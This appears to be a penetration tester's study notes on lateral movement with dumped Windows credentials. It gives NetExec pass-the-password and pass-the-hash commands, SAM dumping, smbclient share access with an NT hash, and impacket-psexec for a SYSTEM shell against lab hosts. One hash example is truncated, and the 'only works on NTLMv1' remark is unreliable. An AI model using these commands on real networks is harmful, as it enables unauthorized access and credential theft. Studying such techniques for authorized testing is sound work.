If SAM hashes or passwords are dumped, we can pass them to other services/accounts to see if they work there as well.
# NetExec
https://www.netexec.wiki/
## Pass the Password
NetExec (crackmapexec is no longer supported) Pass the Password example:
```bash
nxc smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
```
This command enumerates smb to check if fcastle:Password1 gets access to anything. It will list machines with Admin access as "Pwn3d!".
## Pass the Hash
Pass the Hash example (only works on NTLMv1):
```bash
nxc smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:6c598d4edc98d0a0c9797ef98 --local-auth 
```
* --sam can dump SAM database of any pwned machines.
* --shares will list all shares that pwned machines can access.
List all nxc modules:
```bash
nxc smb -L
```
To view nxc database (that is auto-filled with data gathered from other nxc commands), do the following:
```bash
cmedb
help
# Use any of the commands displayed e.g.
hosts
creds
```
# SMBClient
SMBClient can also be used to access restricted file shares via pass the hash.
Example:
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
# PSExec/WMIExec
The PSExec script is very similar to the Sysinternals PsExec command.
To execute psexec, we can enter impacket-psexec with two arguments. The first argument is -hashes, which allows us to use NTLM hashes to authenticate to the target. The format is "LMHash:NTHash", in which we specify the Administrator NTLM hash after the colon. Since we only use the NTLM hash, we can fill the LMHash section with 32 0's.
The second argument is the target definition in the format "username@IP".
At the end of the command we could specify another argument, which is used to determine which command psexec should execute on the target system. If we leave it empty, cmd.exe will be executed, providing us with an interactive shell.

**PSExec gives you a SYSTEM shell. WMIexec gives you a shell of the user (in this case 'Administrator').**

Example:
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
Note: In the above example, the 0000...: was added to the start of the hash.
